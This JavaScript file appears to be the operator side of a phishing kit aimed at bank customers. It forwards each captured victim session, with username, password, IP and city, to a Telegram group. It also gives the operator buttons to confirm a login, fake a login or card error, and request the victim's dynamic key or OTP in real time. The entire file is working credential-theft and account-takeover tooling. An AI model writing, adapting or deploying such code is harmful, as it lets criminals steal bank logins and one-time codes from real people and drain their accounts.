import {
  activeSessions,
  decisionMap,
  buildMessageText,
} from "../controllers/botController.js";

import { v4 as uuidv4 } from "uuid";

const pendingDecisions = new Map();

export function waitForDecision(decisionId, step = 1) {
  return new Promise((resolve, reject) => {
    if (pendingDecisions.has(decisionId)) {
      pendingDecisions.delete(decisionId);
    }
    pendingDecisions.set(decisionId, { resolve, reject, step });
  });
}

export function removePending(decisionId) {
  pendingDecisions.delete(decisionId);
}

export const sendTelegramAlert = async ({
  sessionId,
  groupId,
  text,
  messageId,
}) => {
  let buttons = [];
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const telegramApi = `https://api.telegram.org/bot${token}/sendMessage`;
  const session = activeSessions.get(sessionId);
  const decisionId = session.decisionId;
  const step = session.step || 1;
  const showOptions = session.showOptions || false;
  if (step === 1) {
    buttons = [
      [
        { text: "Continuar", callback_data: `continue:${decisionId}` },
        { text: "Error de Login", callback_data: `errorLogin:${decisionId}` },
      ],
    ];
  } else if (step === 2 && showOptions === true) {
    buttons = [
      [
     /*    { text: "Pedir OTP", callback_data: `requestOtp:${decisionId}` }, */
        {
          text: "Pedir Dinamica",
          callback_data: `requestDinamica:${decisionId}`,
        },
        { text: "Error CC", callback_data: `errorCC:${decisionId}` },
      ],
    ];
  } else if (step === 3) {
    buttons = [
      [
        {
          text: "Finalizar",
          callback_data: `finalize:${decisionId}`,
        },
        {
          text: "Error Dinamica",
          callback_data: `errorDinamica:${decisionId}`,
        },
        /* {
          text: "Pedir Dinamica",
          callback_data: `requestDinamica:${decisionId}`,
        }, */
      ],
    ];
  } else if (step === 4) {
    buttons = [
      [
        {
          text: "Finalizar",
          callback_data: `finalize:${decisionId}`,
        },
        {
          text: "Error Dinamica",
          callback_data: `errorDinamica:${decisionId}`,
        }/* ,
        { text: "Pedir OTP", callback_data: `requestOtp:${decisionId}` }, */
      ],
    ];
  }

  const response = await fetch(telegramApi, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: process.env.GROUP_1,
      text,
      reply_markup: {
        inline_keyboard: buttons,
      },
    }),
  });

  const result = await response.json();
  if (!result.ok) {
    console.error("Telegram error:", result);
    return { message_id: null };
  }

  return {
    message_id: result.result.message_id,
  };
};

export async function respondToTelegramCallback(callback) {
  const [action, decisionId] = callback.data.split(":");
  const sessionId = decisionMap.get(decisionId);
  const session = activeSessions.get(sessionId);
  if (!session) return;

  let newText = session.messageText; // Debe almacenarse en la sesión
  let newStep = session.step;
  if (session.step === 1 && action === "errorLogin") {
    // Generar nuevo decisionId

    // Actualizar mensaje de Telegram
    const newText = buildMessageText(session, 1);
    await editTelegramMessage({
      chatId: process.env.GROUP_1,
      messageId: session.messageId,
      text: newText,
    });

    session.user = "";
    session.pass = "";
    session.ip = "";
    session.city = "";
    session.step = 1;

    const newDecisionId = uuidv4();
    session.decisionId = newDecisionId;

    // Actualizar decisionMap y crear nueva promesa
    decisionMap.set(newDecisionId, sessionId);
    decisionMap.delete(decisionId); // Limpiar el anterior

    // Volver a esperar decisión con el nuevo decisionId
  } else if (session.step === 1 && action === "continue") {
    // Etapa 1 → Etapa 2
    newStep = 2;
    newText = buildMessageText(session);
    const successMsg = `
🚨 Ingreso: ${session.sessionId.split("-")[0]} 🚨
✅ Login exitoso ✅
    `;
    await sendSimpleTelegramMessage(successMsg);

    // Actualiza botones a "Error Datos"
    await editTelegramMessage({
      chatId: process.env.GROUP_1,
      messageId: session.messageId,
      text: newText,
    });
  } else if (session.step === 2 && action === "errorCC") {
    const successMsg = `
🚨 Ingreso: ${session.sessionId.split("-")[0]} 🚨
❌ Error CC ❌
    `;
    await sendSimpleTelegramMessage(successMsg);
  } else if (session.step === 3 && action === "errorDinamica") {
    const successMsg = `
🚨 Ingreso: ${session.sessionId.split("-")[0]} 🚨
❌ Error Dinamica ❌
    `;
    await sendSimpleTelegramMessage(successMsg);
  } else if (
    session.step === 2 &&
    ["requestDinamica", "requestOtp"].includes(action)
  ) {
    // Etapa 2 → Etapa 3
    session.step = 3;
    newText = buildMessageText(session);

    // Actualiza botones a "Error Dinámica" y "Error OTP"
    await editTelegramMessage({
      chatId: process.env.GROUP_1,
      messageId: session.messageId,
      text: newText,
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Error Dinámica",
              callback_data: `errorDinamica:${decisionId}`,
            },
           /*  { text: "Error OTP", callback_data: `errorOtp:${decisionId}` }, */
            { text: "Finalizar", callback_data: `finalize:${decisionId}` },
          ],
        ],
      },
    });

    // Actualizar decisionMap y crear nueva promesa
    decisionMap.set(decisionId, sessionId);
    decisionMap.delete(decisionId); // Limpiar el anterior
  } /* else if (session.step === 3) {
    if (action === "errorOtp" || action === "errorDinamica") {
      // Actualiza el mensaje con el error
      const err = action === "errorOtp" ? 4 : 3;
      const newText = buildMessageText(session, err);

      await editTelegramMessage({
        chatId: process.env.GROUP_1,
        messageId: session.messageId,
        text: newText,
        reply_markup: {
          inline_keyboard: [
            [
              { text: "Finalizar", callback_data: `finalize:${decisionId}` },
              { text: "Error OTP", callback_data: `errorOtp:${decisionId}` },
              {
                text: "Error Dinámica",
                callback_data: `errorDinamica:${decisionId}`,
              },
            ],
          ],
        },
      });
    }
  } */ else if (session.step === 3) {
    // Actualiza el mensaje con el error
    const err = 3;
    const newText = buildMessageText(session, err);

    await editTelegramMessage({
      chatId: process.env.GROUP_1,
      messageId: session.messageId,
      text: newText,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Finalizar", callback_data: `finalize:${decisionId}` },
            /* { text: "Error OTP", callback_data: `errorOtp:${decisionId}` }, */
            {
              text: "Pedir Dinámica",
              callback_data: `requestDinamica:${decisionId}`,
            },
          ],
        ],
      },
    });
  } else if (session.step === 4) {
    // Actualiza el mensaje con el error
    const err = 3;
    const newText = buildMessageText(session, err);

    await sendSimpleTelegramMessage(newText,3);

    await editTelegramMessage({
      chatId: process.env.GROUP_1,
      messageId: session.messageId,
      text: newText,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Finalizar", callback_data: `finalize:${decisionId}` },
            { text: "Pedir OTP", callback_data: `requestOtp:${decisionId}` },
            {
              text: "Error Dinámica",
              callback_data: `errorDinamica:${decisionId}`,
            },
          ],
        ],
      },
    });
  }
  // Resuelve la promesa y actualiza la sesión
  if (pendingDecisions.has(decisionId)) {
    pendingDecisions.get(decisionId).resolve(action);

    session.messageText = newText;
    pendingDecisions.delete(decisionId);
  }

  /* await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      callback_query_id: callback.id,
      text: `Has seleccionado: ${decision}`,
      show_alert: false,
    }),
  });

  if (pendingDecisions.has(decisionId)) {
    const { resolve } = pendingDecisions.get(decisionId);
    resolve(decision);
    pendingDecisions.delete(decisionId);
  } */
}

export const sendSimpleTelegramMessage = async (text) => {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: process.env.GROUP_1, text }),
  });

  const data = await res.json();
  return data.result;
};

export const editTelegramMessage = async ({
  chatId,
  messageId,
  text,
  reply_markup,
}) => {
  const token = process.env.TELEGRAM_BOT_TOKEN;

  const payload = {
    chat_id: chatId,
    message_id: messageId,
    text,
    parse_mode: "HTML",
  };

  if (reply_markup) {
    payload.reply_markup = reply_markup;
  }

  const response = await fetch(
    `https://api.telegram.org/bot${token}/editMessageText`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    }
  );

  const result = await response.json();
  return result.result;
};
